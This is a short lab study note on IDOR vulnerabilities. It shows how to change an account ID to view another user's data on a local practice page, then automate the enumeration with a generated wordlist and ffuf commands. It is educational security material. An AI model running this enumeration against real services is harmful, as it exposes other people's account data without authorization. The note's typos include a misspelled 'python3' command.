Basically it is arises when we are able to access an object, on which we have no authorization, using his id.

It is very common in API driven applications.

# IDOR 0x01
Here we can see thta using the account ID we can access to user information:
- ![[Pasted image 20250107161818.png]]
- in this casse the id is `1009`

In fact if we put `1010` we obtain:
- ![[Pasted image 20250107161909.png]]


So what we want is to gett all the possible information making this process automatic.

First of all we need a wordlist:
```bash
pyhton3 -c 'for i in range(1,20001): print(i)' > wordlist.txt
```



At this point we use `ffuf` to run the attack:
```bash
ffuf -u 'http://localhost/labs/e0x02.php?account=FUZZ' -w wordlist.txt -fs 849
```
- we need to filter as the size
- in this case the size of an `id` that doesn't exist is `849`


We can also adjust the output with `grep`
```bash
ffuf -u 'http://localhost/labs/e0x02.php?account=FUZZ' -w wordlist.txt -fs 849 | grep FUZZ
```
- ![[Pasted image 20250107162324.png]]


At this point we can look at all user info, in general we need to use Burp Intruder to filter for specific info.

